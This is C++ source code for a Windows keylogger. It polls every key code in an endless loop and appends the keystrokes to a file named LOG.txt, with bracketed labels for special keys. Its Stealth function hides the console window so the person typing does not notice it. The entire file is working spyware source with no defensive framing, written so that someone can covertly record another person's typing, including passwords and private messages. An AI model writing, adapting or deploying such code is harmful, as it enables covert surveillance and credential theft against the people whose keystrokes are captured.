#include <iostream>
using namespace std;
#include <Windows.h>
#include <WinUser.h>

int save(int keyStroke, char *file);
void Stealth();

int main() {
	Stealth();
	char i;
	while (1) {
		for (i = 8; i <= 190; i++) {
			if (GetAsyncKeyState(i) == -32767) save(i, "LOG.txt");

		}
	}
	system("PAUSE");
	return 0;
}

int save(int keyStroke, char *file) {
	if ((keyStroke == 1) || (keyStroke == 0)) return 0;
	
	FILE *outf;  // Define the file we will write to
	outf = (fopen(file, "a+"));  //open the file we just defined;

	cout << keyStroke << endl;

	if (keyStroke == 8)  // The numbers stands for the ascii value of a character
		fprintf(outf, "%s", "[BACKSPACE]");  // This will print [BACKSPACE] when key 8 is pressed. All the code under this works the same.
	else if (keyStroke == 13)
		fprintf(outf, "%s", "\n"); // This will make a newline when the enter key is pressed.
	else if (keyStroke == 32)
		fprintf(outf, "%s", " ");
	else if (keyStroke == VK_TAB)              //VK stands for virtual key wich are the keys like Up arrow, down arrow..
		fprintf(outf, "%s", "[TAB]");
	else if (keyStroke == VK_SHIFT)
		fprintf(outf, "%s", "[SHIFT]");
	else if (keyStroke == VK_CONTROL)
		fprintf(outf, "%s", "[CONTROL]");
	else if (keyStroke == VK_ESCAPE)
		fprintf(outf, "%s", "[ESCAPE]");
	else if (keyStroke == VK_END)
		fprintf(outf, "%s", "[END]");
	else if (keyStroke == VK_HOME)
		fprintf(outf, "%s", "[HOME]");
	else if (keyStroke == VK_LEFT)
		fprintf(outf, "%s", "[LEFT]");
	else if (keyStroke == VK_UP)
		fprintf(outf, "%s", "[UP]");
	else if (keyStroke == VK_RIGHT)
		fprintf(outf, "%s", "[RIGHT]");
	else if (keyStroke == VK_DOWN)
		fprintf(outf, "%s", "[DOWN]");
	else if (keyStroke == 190 || keyStroke == 110)
		fprintf(outf, "%s", ".");
	else
		fprintf(outf, "%s", &keyStroke);
	fclose(outf);
	return 0;
}

void Stealth() {
	HWND Stealth;  //TODO google what the fuck this does
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}
